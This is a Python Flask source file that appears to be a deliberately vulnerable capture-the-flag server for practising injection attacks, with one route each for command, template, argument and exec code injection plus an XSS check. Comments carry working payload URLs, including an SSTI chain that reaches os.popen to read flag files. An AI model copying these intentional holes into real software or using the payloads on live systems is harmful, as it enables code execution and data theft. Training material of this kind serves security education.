from flask import Flask, render_template, request, render_template_string, request, Markup
import subprocess
from subprocess import PIPE
from io import StringIO
from contextlib import redirect_stdout
import os
from os import system 
import subprocess
import sys
import time
from bs4 import BeautifulSoup
from slimit import ast
from slimit.parser import Parser
from slimit.visitors import nodevisitor

'''
Add JS styling
Add REAL spaces
Make the container 'readonly' except for a tmp directory with the databases

Challenges to add: 
- SQLi 
- NoSQLi
- XSS? 
'''

app = Flask(__name__)

# Command injection
# http://127.0.0.1:5000/ping/?domain=google.com;%20cat%20/flags/flag1.txt
@app.route('/ping/')
def ping():
   domain = request.args.get('domain') 
   if(domain == None):
      return "Please add commands to the 'domain' parameter"


   # Parent process exit...
   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)

   # flag1 user
   os.setuid(1000) 

   command = "ping -c 1 " + domain
   p = subprocess.Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, encoding="utf-8")
   output, error = p.communicate()

   print(output,error)
   return render_template('ping.html',contents=output, command=command, domain=domain) 

# Template injection
# https://secure-cookie.io/attacks/ssti/
# http://127.0.0.1:5000/name/?name=%7B%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%%7D%7B%%20if%20%22warning%22%20in%20x.__name__%20%%7D%7B%7Bx()._module.__builtins__[%27__import__%27](%27os%27).popen(%22cat%20/flags/*%22).read()%7D%7D%7B%endif%%7D%7B%%20endfor%20%%7D
# http://127.0.0.1:5000/name/?name={{flag}}
@app.route('/name/') 
def my_name():
   name = request.args.get('name') 
   if(name == None):
      return "Please add commands to the 'name' parameter"

   t = """
<html>
  <head>
    <title>What's your name?</title>
  </head>
  <body>
    <p>{}</p>
  </body>
</html>
""".format(name) 

   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)

   # flag2 user
   os.setuid(1001) 

   # Read the flag in - can reference the flag as an object now.
   flagfile = open("flags/flag2.txt", 'r')
   flag = flagfile.read()

   return render_template_string(t, flags=flag, flag=flag)

# can't get to work :(
@app.route('/find/')
def find():
   d = request.args.get('d')
   if(d == None):
      return "Please add commands to the 'd' parameter"

   command = "find . -name '*{}*'".format(d).split(" ") 
   print(command) 

   p = subprocess.Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, encoding="utf-8") 
   output, error = p.communicate()
   return render_template('ping.html', contents=output + ",error:" +  error, command=command)

# Argument injection
# http://127.0.0.1:5000/date/?d=100%20/flags/flags3.txt
@app.route('/head/')
def head():
   d = request.args.get('d')
   if(d == None):
      return "Please add commands to the 'd' parameter"

   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)

   # flag3 user
   os.setuid(1002)

   command = "head -c {} /tmp/test_file.txt".format(d).split(" ") 
   print(command) 

   p = subprocess.Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, encoding="utf-8") 
   output, error = p.communicate()
   return render_template('ping.html', contents=output + ", error: " + error, command=command)

# Argument injection 2
# http://127.0.0.1:5000/date/?d=-f%20flags/flag3.txt
@app.route('/date/')
def date():

   f = request.args.get('d')
   if(f == None):
      return "Please add commands to the 'd' parameter"

   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)

   # flag3 user
   os.setuid(1002) 

   # Add in your own flags for the date command. Can be used to change the formatting.
   # Bash commands don't work!
   command = "date {}".format(f).split(" ") 
   print(command) 

   p = subprocess.Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, encoding="utf-8") 
   output, error = p.communicate()
   return render_template('ping.html', contents=output + ", error: " + error, command=command)

# Code injection - exec
# http://127.0.0.1:5000/building_data?name=a&address=%27%0Aprint(open(%27/flags/flag4.txt%27).read())%0A%27%20c=%27d
@app.route('/building_data')
def building():

   data = {}
   name = request.args.get('name')
   location = request.args.get('address')
   if(name == None or location == None):
      return "Please add commands to the 'name' and 'address' parameters"

   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)
 
   # flag4 user
   os.setuid(1003) 

   # Set the group in order to restrict the permissions
   command = "data['{}'] = '{}'".format(name, location)
   f = StringIO()

   try:
      with redirect_stdout(f):
         exec(command)

      result = "Result of execution: ", f.getvalue()
   except Exception as e:
      print(e)
      result = "Error: " + str(e)

   return render_template('ping.html', contents=result, command=command)

# JavaScript Code injection
@app.route('/xss', methods=["GET", "POST"])
def xss():
   data = ""
   if 'input' in request.form:
      data = request.form['input']

   if(os.fork() != 0):
       time.sleep(5)
       sys.exit(1)
 
   # flag5 user
   os.setuid(1004) 

   html = render_template('xss.html', userInput=Markup(data), flag=None)
   if(parse_xss(html) == True):
      # Read the flag in - can reference the flag as an object now.
      flagfile = open("/flags/flag5.txt", 'r')
      flag = flagfile.read()
      return render_template('xss.html', userInput=Markup(data), flag=flag)
   else: 
      return html

def filter_on_event(tag):
   if(tag.name != "span"):
      return False

   childTags = tag.findChildren()

   for tag in childTags:
      keys = list(tag.attrs.keys())
      print(tag)
      print(keys)
      for key in keys:
         if(key[0:2] == "on"):
            return True
   return False

def parse_xss(html1):
   soup = BeautifulSoup(html1)
   scripts = soup.find_all('script')
   if(len(scripts) > 0 and 'alert(' in str(scripts[0])):
      return True

   scripts = soup.findAll(filter_on_event)

   # Parse if in an 'on*' block
   if len(scripts) > 0:
      childTags = scripts[0].findChildren()

      for tag in childTags:
         keys = list(tag.attrs.keys())
         for key in keys:
            if(key[0:2] == "on"):
              data = tag[key]
              print(data)
              parser = Parser()
              tree = parser.parse(data)
              for node in nodevisitor.visit(tree):
                    if 'alert(' in node.to_ecma():
                       return True

   return False

app.run(host='0.0.0.0', port=5000)
